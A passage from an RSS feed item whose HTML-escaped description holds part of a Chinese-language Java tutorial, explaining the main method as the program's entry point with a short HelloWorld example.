style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;主方法（main方法）&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;主方法是Java应用程序的入口点。当程序启动时，JVM会寻找并执行这个方法。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;示例：&lt;/p&gt;&#xA;&lt;p&gt;java深色版本&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HelloWorld hello &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HelloWorld();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hello.&lt;span style=&#34;color:#a6e22e&#34;&gt;sayHello&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;示例代码&#34;&gt;示例代码&lt;a href=&#34;#%e7%a4%ba%e4%be%8b%e4%bb%a3%e7%a0%81&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;p&gt;以下是一个完整的Java文件示例，结合了上述各个部分：&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
